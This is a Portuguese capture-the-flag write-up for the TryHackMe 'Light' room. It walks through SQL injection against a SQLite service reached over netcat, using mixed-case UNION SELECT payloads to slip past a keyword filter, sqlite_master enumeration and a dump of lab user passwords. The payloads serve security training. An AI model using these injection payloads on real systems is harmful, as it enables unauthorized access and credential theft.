> [!WARNING]
> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).

# [Light](https://tryhackme.com/room/lightroom)

<a href="https://tryhackme.com/room/lightroom"><figure><img src="./assets/logo.png" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> Welcome to the Light database application!

Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/lightroom), feito por [tryhackme](https://tryhackme.com/p/tryhackme) e [hadrian3689](https://tryhackme.com/p/hadrian3689).

Dificuldade: `Fácil`

Resolvido em: `2026/07/03`

# Conteúdos

- [Light](#light)
- [Conteúdos](#conteúdos)
- [Writeup](#writeup)

# Writeup

A máquina é bem simples, com as instruções de acesso já disponíveis na sua descrição:

```
I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc 10.66.142.90 1337
You can use the username smokey in order to get started.
```

O processo é, então, responder as três perguntas disponibilizadas:

- Q: What is the admin username?
- Q: What is the password to the username mentioned in question 1?
- Q: What is the flag?

Depois de um cheque básico de conexão...

```bash
$ ping -c 3 10.66.142.90
PING 10.66.142.90 (10.66.142.90) 56(84) bytes of data.
64 bytes from 10.66.142.90: icmp_seq=1 ttl=62 time=197 ms
64 bytes from 10.66.142.90: icmp_seq=2 ttl=62 time=220 ms
64 bytes from 10.66.142.90: icmp_seq=3 ttl=62 time=244 ms

--- 10.66.142.90 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 196.913/220.374/244.211/19.311 ms
```

Basta entrar no servidor de SQL com o `netcat`[^nc] como indicado pela descrição.

```bash
$ nc 10.66.142.90 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: admin
Username not found.
```

Parece que o sistema é uma query simples, em que passamos o usuário, e o sistema retorna sua senha. Um teste simples revela que o sistema é vulnerável:

```
Please enter your username: '
Error: unrecognized token: "' LIMIT 30"
```

De imediato, porém, certas técnicas padrões de `SQLi` estão impedidas:

```
Please enter your username: ' OR '1'='1' ---
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: ' OR SUBSTRING('', 1, 30) OR 'a
Error: no such function: SUBSTRING
Please enter your username: union
Ahh there is a word in there I don't like :(
Please enter your username: select
Ahh there is a word in there I don't like :(
```

O uso de comentários está desativado (confie em mim, eu tentei até URL bypass), não existe funções de sistema (como `substring()` ou `database()`) e certas palavras-chave estão bloqueadas (`union` e `select`).

O bloqueio das palavras-chave, contudo, está mal-implementado:

```
Please enter your username: sElect
Username not found.
Please enter your username: uNion
Username not found.
```

Ou seja, ainda podemos utilizá-los. Antes disso, vale a pena visualizar o query por completo. Considerando que apenas a senha é retornada, e que o teste com `'` mais cedo revelou parte da query, pode-se assumir com grande certeza que a query tem o formato:

```sql
SELECT password FROM users WHERE username='input' LIMIT 30;
```

Com `username` e `password` colunas da tabela `users` e `input` o texto de input. Por causa do `LIMIT 30;` no final da query, torna-se inviável o uso de `ORDER BY`, mas não é grande perca.

Então segue para as tentativas de fazer o sistema responder com minha própria query...

```
Please enter your username: ' uniOn sElect 1 where '1'='1
Password: 1
Please enter your username: ' uniOn sElect 2 where '1'='1
Password: 2
```

E com isso, finalmente consigo descobrir a versão do sistema.

```
Please enter your username: ' uniOn sElect banner FROM v$version where '1'='1
Error: no such table: v$version
Please enter your username: ' uniOn sElect version FROM v$instance where '1'='1
Error: no such table: v$instance
Please enter your username: ' uniOn sElect version() where '1'='1
Error: no such function: version
Please enter your username: ' uniOn sElect @@version where '1'='1
Error: unrecognized token: "@"
Please enter your username: ' uniOn sElect %40%40version where '1'='1
Error: near "%": syntax error
Please enter your username: ' uniOn sElect SERVERPROPERTY('productversion') where '1'='1
Error: no such function: SERVERPROPERTY

Please enter your username: ' uniOn sElect sqlite_version() where '1'='1
Password: 3.31.1
```

Opa! Temos aqui um `SQLite 3.31.1`. Ótimo! Com essa informação consigo atacar os valores de metadado do `SQLite`, em específico `sqlite_master`, com uma enumeração:

```
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='1
Password: usertable
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='2
Password: admintable
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='3
Username not found.
```

> Em `SQLite`, `rowid` é um `unsigned int` intrínseco associado com cada coluna, único por tabela. Começa com `1`.

Temos duas tabelas: `usertable` e `admintable`. O ataque é similar, agora usando esses valores novos:

```
' uniOn sElect username FROM usertable WHERE rowid='0
```

Assumindo, aqui, que os nomes das colunas são `username` e `password`. Senão, teria de primeiro descobrir tais.

Fazendo enumeração de ambas, obtenho para `usertable`:

```
Please enter your username: alice
Password: tF8tj2o94WE4LKC
Please enter your username: rob
Password: yAn4fPaF2qpCKpR
Please enter your username: john
Password: e74tqwRh2oApPo6
Please enter your username: michael
Password: 7DV4dwA0g5FacRe
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: hazel
Password: EcSuU35WlVipjXG
Please enter your username: ralph
Password: YO1U9O1m52aJImA
Please enter your username: steve
Password: WObjufHX1foR8d7
```

E, para `admintable`:

```
Please enter your username: ' uniOn sElect username FROM admintable where rowid='1
Password: <ADMIN_U>
Please enter your username: ' uniOn sElect password FROM admintable where rowid='1
Password: <ADMIN_P>

Please enter your username: ' uniOn sElect username FROM admintable where rowid='2
Password: flag
Please enter your username: ' uniOn sElect password FROM admintable where rowid='2
Password: <FLAG_SQL>
```

Simples e efetivo.

- Q: What is the admin username? A: <ADMIN_U>
- Q: What is the password to the username mentioned in question 1? A: <ADMIN_P>
- Q: What is the flag? A: <FLAG_SQL>

[^nc]: https://nc110.sourceforge.io/